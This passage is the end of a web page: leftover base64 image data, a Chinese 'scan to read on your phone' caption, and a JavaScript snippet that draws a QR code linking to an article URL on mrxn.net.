uEEPraG4KDRPeB4BwLXQuRg0TnhNI+MsjakVZ9ZJA6CF+8bd2Q0eldyE3f1D21it7riJvlIJ4GwLIhAtubJORv3pAchO/1IWJIfW0Mka/c3ncvoXMQdYCpti9ITjVH1gqLU7WmgdZ73RCfyhDfT7b3EMgpwXO+t+3pO67onBD6/lV7xofoUbUQnNaw1bx8CA2g8NBcLwS2J1i+bV8IoQH2qYexewrXDXl4XO8VrIG897wfrtYGouvyjM06A9sVB2ayp3OP9nemYe0BbPs8U/dIU/vOtBBrAk0GbPsA1t+yvj7so90Q7wtyWtD71n0H69Nkf9bPGji3H0ida42jdSD1o/yMg6yFe39U530InZdv6wZi0cJrTmAN5JpzP1z1RwcCcWUPV/vBhK84xJqQv6k7J4TMA8MdSLe3obCQ1hequaMc0N64IfyR7kcH0na0nOkJzJI/OhBPvCLE0zDaBEQOxk+3ayB0j/pC6CDRNftegKkhAu2JtgB6zv0rWl+x5u07D9n3RwfiBRa+fgJrIK+f3a9UdgPxdTrCM7uAvILWQ3IQfl0DgoMeRz3MVXS/ykH0c65i1dmH0DsWuka+DUIHx+g6oesqQtQqb+sGUguW//4TaAOBmBacw9lWPe2KM33N1Zq9X3UjH2Lv+zrFEDlIdA9ITlqZc49QWtlIB9kXwh/pKtcGUsnlX3cCayDXnf1w5X8BAAD//9FOh7UAAAAGSURBVAMAHC1erRBn+XUAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-DigestDownLoad-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 